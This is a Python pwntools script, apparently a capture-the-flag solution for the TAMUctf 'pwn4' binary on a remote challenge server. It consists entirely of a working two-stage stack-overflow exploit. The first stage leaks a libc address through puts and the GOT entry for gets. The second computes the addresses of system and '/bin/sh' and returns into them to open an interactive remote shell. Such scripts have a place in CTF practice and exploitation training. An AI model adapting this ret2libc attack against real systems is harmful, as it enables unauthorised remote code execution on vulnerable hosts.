from pwn import *

def exploit():
    binary = ELF("./pwn4")
    p = remote("pwn.tamuctf.com", 4324)

    padding = 36
    payload = "/" + "A" * padding
    puts_plt = p32(binary.symbols["plt.puts"])
    laas = p32(binary.symbols["laas"])
    gets_got = p32(binary.symbols["got.gets"])
    payload += puts_plt + laas + gets_got

    p.sendline(payload)
    p.recvuntil("No slashes allowed\n")

    libc = u32(p.recv(4))
    log.info("Libc leak: {}".format(hex(libc)))
    system_libc = libc - 0x24540
    log.info("System leak: {}".format(hex(system_libc)))
    str_bin_sh = libc + 0xfc77f
    log.info("/bin/sh leak: {}".format(hex(str_bin_sh)))

    payload = "/" + "A" * padding
    payload += p32(system_libc) + "JUNK" + p32(str_bin_sh)
    p.sendline(payload)
    p.interactive()
if __name__ == "__main__":
    exploit()
